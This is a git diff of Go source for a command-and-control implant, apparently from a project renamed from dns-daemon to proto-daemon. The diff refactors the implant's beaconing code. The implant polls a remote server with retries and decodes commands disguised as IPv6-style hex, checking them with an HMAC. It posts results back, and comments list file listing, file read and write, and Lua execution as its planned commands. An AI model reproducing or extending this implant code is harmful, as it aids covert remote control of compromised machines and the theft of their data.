@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bytes"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -9,82 +8,24 @@ import (
 	"log"
 	"net/http"
 	"net/url"
-	"time"
 
-	"github.com/matt-culbert/dns-daemon/Implant/shared"
+	"github.com/matt-culbert/proto-daemon/Implant/shared"
 )
 
-// Struct to hold the response format from the server
+// ResponseData Struct to hold the response format from the server
 // The key is the HMAC used to verify the data retrieved using a shared secret
 type ResponseData struct {
 	Message string `json:"message"`
 	Key     string `json:"key"`
 }
 
-// makeGetRequest makes a GET request to the given URL
-// It takes in 3 parameters
-// 1) The base URL to make the request to
-// 2) The maximum number of retries before giving up
-// 3) The query parameters to include in the request
-// It returns the response and any error that occurred
-func makeGetRequest(baseUrl string, maxRetries int, params url.Values) (*http.Response, error) {
-	var resp *http.Response
-	var err error
-	reqURL, _ := url.Parse(baseUrl)
-	reqURL.RawQuery = params.Encode()
-
-	for attempts := 0; attempts < maxRetries; attempts++ {
-		resp, err = http.Get(reqURL.String())
-		if err == nil {
-			// Success, return the response
-			return resp, nil
-		}
-
-		// Log the error and retry after a delay
-		//fmt.Printf("Error making GET request (attempt %d/%d): %v\n", attempts+1, maxRetries, err)
-		attempts++
-		time.Sleep(10 * time.Second)
-	}
-
-	// Return the last error after exhausting retries
-	return nil, fmt.Errorf("failed to fetch URL after %d attempts: %w", maxRetries, err)
-}
-
-// makePostRequest makes a POST request to the given URL
-// It takes in 3 parameters
-// 1) The base URL to make the request to
-// 2) The params of the message
-// It returns the response and any error that occurred
-func makePostRequest(baseUrl string, params string) (*http.Response, error) {
-	reqURL, _ := url.Parse(baseUrl)
-	// Create the data payload
-	data := map[string]string{
-		"msg": params,
-	}
-
-	// Marshal the data to JSON
-	jsonData, err := json.Marshal(data)
-	if err != nil {
-		return nil, fmt.Errorf("error marshaling JSON: %v", err)
-	}
-
-	// Send the HTTP POST request
-	resp, err := http.Post(reqURL.String(), "application/json", bytes.NewBuffer(jsonData))
-
-	if err != nil {
-		return nil, fmt.Errorf("error sending POST request: %v", err)
-	}
-
-	return resp, nil
-}
-
-// The 4 byte ID for the implant to use set at compile time
+// CompUUID The 4 byte ID for the implant to use set at compile time
 var CompUUID string
 
-// The POST URI to use, varies on if compression is enabled or not
+// PostURI The POST URI to use, varies on if compression is enabled or not
 var PostURI string
 
-// The GET URI to use, varies on if auth is enabled or not
+// GetURI The GET URI to use, varies on if auth is enabled or not
 var GetURI string
 
 func main() {
@@ -128,14 +69,19 @@ func main() {
 		// makeGetRequest 3 times with a 10 second delay between each attempt
 		// if the request is successful, break the loop
 		// otherwise, the 3 timeouts cause the program to exit
-		resp, err := makeGetRequest(baseUrl, maxRetries, params)
+		resp, err := shared.GetDataRequest(baseUrl, maxRetries, params)
 		if err != nil {
 			fmt.Println("Final error:", err)
 			return
 		}
 
 		// Defer closing the response body until the for loop breaks
-		defer resp.Body.Close()
+		defer func(Body io.ReadCloser) {
+			err := Body.Close()
+			if err != nil {
+				return
+			}
+		}(resp.Body)
 
 		// Check the response status
 		if resp.StatusCode != http.StatusOK {
@@ -164,7 +110,7 @@ func main() {
 
 		// The response comes encoded in a hex format that mimics IPv6 IPs
 		// Decode that data
-		decoded, err := shared.DecodeIPv6ToString(string(data.Message))
+		decoded, err := shared.DecodeIPv6ToString(data.Message)
 		if err != nil {
 			fmt.Println(err)
 			break
@@ -178,7 +124,11 @@ func main() {
 			// A switch statement to run through possible command options, including using the lua engine
 			// List arbitrary dir, read file, write file, execute Lua
 			// Returns the result of execution (stdout or bool) or returns an error
-			makePostRequest(postUrl, "test success")
+			request, err := shared.SendDataRequest(postUrl, "test success")
+			if err != nil {
+				return
+			}
+			fmt.Println(request)
 			break
 		} else {
 			fmt.Println("HMAC is invalid or message was tampered with.")
